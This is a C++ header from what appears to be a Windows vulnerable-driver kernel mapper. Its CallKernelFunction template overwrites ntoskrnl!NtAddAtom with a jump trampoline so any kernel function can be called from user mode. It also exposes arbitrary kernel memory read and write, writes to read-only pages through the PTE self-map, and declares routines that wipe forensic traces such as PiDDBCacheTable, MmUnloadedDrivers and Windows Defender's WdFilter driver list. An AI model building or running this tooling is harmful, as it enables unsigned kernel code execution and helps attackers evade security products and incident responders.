#pragma once

#include <Windows.h>
#include <cstdint>
#include <iostream>
#include <string>

#include "../Utilities/Console.hpp"
#include "../App/NT.hpp"
#include "../Symbols/Handler/SymbolsHandler.hpp"

/*
* Structure offsets used while walking kernel objects.
*
* The defaults are values that have been stable across Windows builds, but with
* the PDB-offset build every one of them is replaced at runtime by the offset of
* the real type in the running kernel (the symbol tool writes them into
* Offsets.ini as "[<module>.fields] Struct.Field=<offset>").
*
* Anything that cannot be resolved from symbols is not trusted on its own: the
* caller must structurally validate the object before writing to it.
*/
struct DriverOffsets {
	uint32_t FileObject_DeviceObject = 0x8;
	uint32_t DeviceObject_DriverObject = 0x8;
	uint32_t DriverObject_DriverSection = 0x28;
	uint32_t LdrEntry_BaseDllName = 0x58;
	uint32_t AvlTable_DeleteCount = 0x40;

	//_PiDDBCacheEntry and HashBucketEntry are not UDTs in the public PDBs, so
	//these stay at their compiled defaults and are additionally derived at
	//runtime by content matching in the callers.
	uint32_t PiDDBCacheEntry_ListBlink = 0x8;
	uint32_t PiDDBCacheEntry_ListFlink = 0x0;
	uint32_t HashBucketEntry_DriverName = 0x8;

	bool ResolvedFromSymbols = false;

	void LoadFromSymbols() {
#ifdef PDB_OFFSETS
		const auto lookup = [](const wchar_t* name, uint32_t& target) {
			const auto value = SymbolsHandler::GetInstance()->GetFieldOffset(name);
			if (value != SymbolsHandler::kFieldUnresolved && value < 0x1000) {
				target = static_cast<uint32_t>(value);
				return true;
			}
			return false;
		};

		bool resolved = false;
		resolved |= lookup(L"_FILE_OBJECT.DeviceObject", FileObject_DeviceObject);
		resolved |= lookup(L"_DEVICE_OBJECT.DriverObject", DeviceObject_DriverObject);
		resolved |= lookup(L"_DRIVER_OBJECT.DriverSection", DriverObject_DriverSection);
		resolved |= lookup(L"_KLDR_DATA_TABLE_ENTRY.BaseDllName", LdrEntry_BaseDllName);
		resolved |= lookup(L"_RTL_AVL_TABLE.DeleteCount", AvlTable_DeleteCount);
		ResolvedFromSymbols = resolved;
#endif
	}
};

namespace Driver
{
	extern DriverOffsets g_offsets;
	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;
	extern bool g_skipForensicCleanup;

	//Load the provider, resolve offsets, verify the PTE self-map and run the
	//cleanup walks. Tears everything down again on any failure.
	NTSTATUS Load();
	NTSTATUS Unload();
	NTSTATUS AcquireDebugPrivilege();

	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	bool IsRunning();
	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);

	//Write to a page that is currently read-only, by temporarily making it
	//writable through the PTE self-map. See the implementation in Driver.cpp.
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);

	//The provider's memcpy. ReadMemory and WriteMemory are both this.
	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);

	uint64_t AllocatePool(Nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(uint64_t address);

	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);

	//Resolve an export by name in a loaded kernel module, 0 when not found or
	//when any validation of the export directory fails.
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);

	/*
	 * Resolve an export by ordinal in a loaded kernel module, 0 when the ordinal
	 * is below the table base or above NumberOfFunctions.
	 *
	 * Uses the function-address table directly and does not need the name or
	 * ordinal tables, so it works for modules that export nothing by name.
	 */
	uint64_t GetKernelModuleExportOrdinal(uint64_t kernel_module_base, uint16_t ordinal);

	//Kernel helpers reached through the call hook below.
	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(Nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	Nt::PiDDBCacheEntry* LookupEntry(Nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);

	//Trace removal. Each one is a no-op when its structure cannot be found and
	//returns false without writing when anything fails validation.
	//Skipped entirely when g_skipForensicCleanup is set.
	bool ClearPiDDBCacheTable();
	bool ClearKernelHashBucketList();
	bool ClearMmUnloadedDrivers();
	bool ClearWdFilterDriverList();

	/*
	 * Call an arbitrary kernel function from user mode.
	 *
	 * How it works: ntoskrnl!NtAddAtom is overwritten with
	 *
	 *     mov rax, <target>   ; 48 b8 <8 byte address>
	 *     jmp rax             ; ff e0
	 *
	 * Calling NtAddAtom from user mode therefore jumps to `target` in kernel
	 * context. The original 12 bytes are read back first and restored as soon
	 * as the call returns, so the hook exists only for the duration of one call.
	 *
	 * Why this is safe enough to do:
	 *   - the prologue is verified to look like real code before patching, so a
	 *     wrong address aborts instead of being written over
	 *   - a prologue that is already the hook shape means another instance is
	 *     running, which is refused
	 *   - the original bytes are restored on both the success and failure path
	 *   - the write itself goes through WriteToReadOnlyMemory, which requires a
	 *     verified PTE self-map
	 *
	 * Residual risk that cannot be designed away: if the process is killed
	 * between the patch and the restore, or the kernel crashes for an unrelated
	 * reason while patched, NtAddAtom is left pointing at the last target.
	 * Another process calling NtAddAtom during the hook window races the call
	 * to the target function. The window is ~10 instructions and cannot be
	 * closed without serialising every NtAddAtom call system-wide.
	 *
	 * A... must be trivially copyable and there can be at most 4 of them, since
	 * the hook passes everything through registers.
	 *
	 * T is the return type; T = void means no result is stored.
	 */
	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		//Only up to 4 arguments can be forwarded through the syscall jump.
		static_assert(sizeof...(A) <= 4, "CallKernelFunction: too many arguments");

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to get ntdll.dll" << std::endl);
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom) {
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		//memcpy instead of a cast: writing through *(uint64_t*)&array[2] is an
		//unaligned access and undefined behaviour.
		memcpy(&kernel_injected_jmp[2], &kernel_function_address, sizeof(kernel_function_address));

		//Cached: the export is the same for the whole run, and resolving it
		//walks the kernel export directory on every single kernel call.
		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(Driver::ntoskrnlAddr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked! another instance of Mapper running?!" << std::endl);
			return false;
		}

		//Pre-flight: refuse to patch anything that does not look like the
		//beginning of a function. Failing here is safe, clobbering a wrong
		//address is a guaranteed bugcheck.
		//Accepts the REX prefixes, push/pop, the common mov-immediate form, and
		//the endbr64 that CET enabled builds start functions with. Rejects
		//int3 padding and anything all zeroes, which is what free memory looks
		//like when the address is wrong.
		auto looks_like_function_prologue = [](const uint8_t* bytes) -> bool {
			uint8_t nonzero = 0;
			for (int i = 0; i < 12; ++i) {
				if (bytes[i] == 0xCC) //int3 padding
					return false;
				if (bytes[i] != 0)
					nonzero++;
			}
			if (nonzero < 2)
				return false;

			switch (bytes[0]) {
			case 0x40: case 0x41: case 0x44: case 0x48: case 0x49:
			case 0x4C: case 0x4D: case 0x50: case 0x51: case 0x52:
			case 0x53: case 0x54: case 0x55: case 0x56: case 0x57:
			case 0xB8: case 0xE9: case 0x0F:
				return true;
			case 0xF3:
				return (bytes[1] == 0x0F && bytes[2] == 0x1E); //endbr64
			default:
				return false;
			}
		};

		if (!looks_like_function_prologue(original_kernel_function)) {
			Log(L"[-] FAILED!: ntoskrnl.NtAddAtom does not look like code, refusing to patch" << std::endl);
			return false;
		}

		if (!WriteToReadOnlyMemory(kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		return WriteToReadOnlyMemory(kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
